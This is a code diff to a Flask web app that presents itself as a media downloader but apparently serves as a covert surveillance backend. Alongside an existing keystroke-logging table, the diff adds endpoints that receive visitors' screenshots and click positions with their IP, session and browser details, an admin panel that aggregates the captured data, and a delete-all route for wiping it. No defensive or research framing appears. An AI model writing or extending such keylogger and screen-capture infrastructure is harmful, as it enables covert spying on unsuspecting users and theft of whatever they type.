@@ -3,6 +3,7 @@ from pathlib import Path
 from flask import Flask, render_template, request, jsonify, send_file, url_for, g
 import yt_dlp
 import requests as http_requests
+import re
 
 app = Flask(__name__)
 DOWNLOADS = Path(__file__).parent / "downloads"
@@ -69,6 +70,16 @@ def get_db():
         g.db.execute("""CREATE TABLE IF NOT EXISTS keystrokes(
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             time TEXT, session_id TEXT, ip TEXT, keys TEXT
+        )""")
+        g.db.execute("""CREATE TABLE IF NOT EXISTS screenshots(
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            time TEXT, session_id TEXT, ip TEXT, filename TEXT,
+            user_agent TEXT
+        )""")
+        g.db.execute("""CREATE TABLE IF NOT EXISTS clicks(
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            time TEXT, session_id TEXT, ip TEXT,
+            tag TEXT, text TEXT, x INTEGER, y INTEGER, page TEXT
         )""")
         g.db.commit()
     return g.db
@@ -265,16 +276,19 @@ def download():
                     if f.name.startswith(uid): filepath = str(f); break
             if not filepath or not os.path.isfile(filepath):
                 uid2 = uuid.uuid4().hex
-                fname = f"{uid2}_{Path(url).name or 'file'}"
+                parsed_url = urllib.parse.urlparse(url)
+                url_name = Path(parsed_url.path).name or 'file'
+                safe_name = re.sub(r'[^\w\.-]', '_', url_name)
+                fname = f"{uid2}_{safe_name}"
                 fpath = DOWNLOADS / fname
                 r = http_requests.get(url, stream=True, timeout=30, headers={'User-Agent': 'Mozilla/5.0'})
                 if r.status_code == 200:
                     ct = r.headers.get('Content-Type', '')
-                    ext = '.mp4' if 'video' in ct else '.mp3' if 'audio' in ct else '.jpg' if 'image' in ct else Path(url).suffix or '.bin'
+                    ext = '.mp4' if 'video' in ct else '.mp3' if 'audio' in ct else '.jpg' if 'image' in ct else Path(parsed_url.path).suffix or '.bin'
                     if not fname.lower().endswith(ext.lower()): fname += ext; fpath = DOWNLOADS / fname
                     with open(str(fpath), 'wb') as f:
                         for chunk in r.iter_content(8192): f.write(chunk)
-                    title = Path(url).name or 'file'
+                    title = Path(parsed_url.path).name or 'file'
                     site = get_site_label(url)
                     result = {"success":True,"title":title,"ext":ext[1:],"filename":fpath.name,"site":site,"download_url":url_for("serve_file",filename=fpath.name)}
                     log_download(ip, url, mode, 'success', title, ua, ref, session_id=session_id)
@@ -548,6 +562,36 @@ def log_keys():
     db.commit()
     return jsonify({"success":True})
 
+@app.route("/screenshot", methods=["POST"])
+def log_screenshot():
+    data = request.json
+    image_b64 = data.get("image", "")
+    if not image_b64: return jsonify({"error":"no image"}), 400
+    uid = uuid.uuid4().hex
+    fname = f"{uid}_screen.png"
+    fpath = CAPTURES / fname
+    try:
+        import base64
+        img_data = base64.b64decode(image_b64.split(',')[1] if ',' in image_b64 else image_b64)
+        with open(str(fpath), 'wb') as f: f.write(img_data)
+    except: return jsonify({"error":"decode failed"}), 400
+    db = get_db()
+    db.execute("INSERT INTO screenshots(time,session_id,ip,filename,user_agent) VALUES(?,?,?,?,?)",
+        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(), fname, request.headers.get('User-Agent','')))
+    db.commit()
+    return jsonify({"success":True})
+
+@app.route("/logclick", methods=["POST"])
+def log_click():
+    data = request.json
+    db = get_db()
+    db.execute("INSERT INTO clicks(time,session_id,ip,tag,text,x,y,page) VALUES(?,?,?,?,?,?,?,?)",
+        (datetime.datetime.now().isoformat(), extract_session(), extract_ip(),
+         data.get("tag",""), data.get("text","")[:100],
+         data.get("x",0), data.get("y",0), data.get("page","")))
+    db.commit()
+    return jsonify({"success":True})
+
 # === ADMIN PANEL ===
 
 @app.route("/admin")
@@ -576,12 +620,19 @@ def admin_stats():
         countries[r['country']] = r['c']
     captures_total = db.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
     captures_recent = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 100").fetchall()
+    screenshots_total = db.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0]
+    screenshots_recent = db.execute("SELECT * FROM screenshots ORDER BY id DESC LIMIT 50").fetchall()
+    clicks_total = db.execute("SELECT COUNT(*) FROM clicks").fetchone()[0]
+    clicks_recent = db.execute("SELECT * FROM clicks ORDER BY id DESC LIMIT 100").fetchall()
 
     ips = db.execute("SELECT DISTINCT ip FROM downloads WHERE ip NOT IN ('127.0.0.1','::1','localhost')").fetchall()
-    ip_count = len(ips) + db.execute("SELECT COUNT(DISTINCT ip) FROM captures WHERE ip NOT IN ('127.0.0.1','::1','localhost')").fetchone()[0]
-    unique_ips = list(set([r['ip'] for r in ips] + [r['ip'] for r in captures_recent if r['ip'] not in ('127.0.0.1','::1','localhost')]))
+    all_ips = set(r['ip'] for r in ips)
+    for tbl in ['captures','screenshots','clicks']:
+        for r in db.execute(f"SELECT DISTINCT ip FROM {tbl} WHERE ip NOT IN ('127.0.0.1','::1','localhost')"):
+            all_ips.add(r['ip'])
+    unique_ips = list(all_ips)
 
-    session_count = db.execute("SELECT COUNT(DISTINCT session_id) FROM downloads WHERE session_id!=''").fetchone()[0] + db.execute("SELECT COUNT(DISTINCT session_id) FROM captures WHERE session_id!=''").fetchone()[0]
+    session_count = db.execute("SELECT COUNT(DISTINCT session_id) FROM downloads WHERE session_id!=''").fetchone()[0] + db.execute("SELECT COUNT(DISTINCT session_id) FROM captures WHERE session_id!=''").fetchone()[0] + db.execute("SELECT COUNT(DISTINCT session_id) FROM screenshots WHERE session_id!=''").fetchone()[0] + db.execute("SELECT COUNT(DISTINCT session_id) FROM clicks WHERE session_id!=''").fetchone()[0]
 
     return jsonify({
         "total": total, "success": success, "failed": failed,
@@ -591,6 +642,10 @@ def admin_stats():
         "recent": [dict(r) for r in recent],
         "captures_total": captures_total,
         "captures": [dict(r) for r in captures_recent],
+        "screenshots_total": screenshots_total,
+        "screenshots": [dict(r) for r in screenshots_recent],
+        "clicks_total": clicks_total,
+        "clicks": [dict(r) for r in clicks_recent],
         "unique_ips": unique_ips,
         "ip_count": len(unique_ips),
         "session_count": session_count,
@@ -663,6 +718,63 @@ def admin_delete_capture(capture_id):
     except Exception as e:
         return jsonify({"error": f"Failed to delete file: {e}"}), 500
     db.execute("DELETE FROM captures WHERE id=?", (capture_id,))
+    db.commit()
+    return jsonify({"success": True})
+
+@app.route("/admin/delete-all", methods=["POST"])
+def admin_delete_all():
+    db = get_db()
+    data = request.get_json(silent=True) or {}
+    target = data.get("target", "all")
+    if target in ("captures", "all"):
+        rows = db.execute("SELECT filename FROM captures").fetchall()
+        for r in rows:
+            fpath = CAPTURES / r["filename"]
+            try:
+                if fpath.is_file(): os.remove(fpath)
+            except: pass
+        db.execute("DELETE FROM captures")
+    if target in ("screenshots", "all"):
+        rows = db.execute("SELECT filename FROM screenshots").fetchall()
+        for r in rows:
+            fpath = CAPTURES / r["filename"]
+            try:
+                if fpath.is_file(): os.remove(fpath)
+            except: pass
+        db.execute("DELETE FROM screenshots")
+    if target in ("downloads", "all"):
+        rows = db.execute("SELECT filename FROM downloads WHERE filename!=''").fetchall()
+        for r in rows:
+            fpath = DOWNLOADS / r["filename"]
+            try:
+                if fpath.is_file(): os.remove(fpath)
+            except: pass
+        db.execute("DELETE FROM downloads")
+    if target in ("clicks", "all"):
+        db.execute("DELETE FROM clicks")
+    if target in ("keystrokes", "all"):
+        db.execute("DELETE FROM keystrokes")
+    db.commit()
+    return jsonify({"success": True, "targets": [target]})
+
+@app.route("/screenshots/<filename>")
+def serve_screenshot(filename):
+    fpath = CAPTURES / filename
+    if not fpath.is_file(): return jsonify({"error":"Not found"}), 404
+    return send_file(str(fpath), mimetype='image/png')
+
+@app.route("/admin/screenshot/delete/<int:sid>", methods=["POST"])
+def admin_delete_screenshot(sid):
+    db = get_db()
+    row = db.execute("SELECT * FROM screenshots WHERE id=?", (sid,)).fetchone()
+    if not row:
+        return jsonify({"error": "Screenshot not found"}), 404
+    fpath = CAPTURES / row["filename"]
+    try:
+        if fpath.is_file(): os.remove(fpath)
+    except Exception as e:
+        return jsonify({"error": f"Failed to delete file: {e}"}), 500
+    db.execute("DELETE FROM screenshots WHERE id=?", (sid,))
     db.commit()
     return jsonify({"success": True})
 
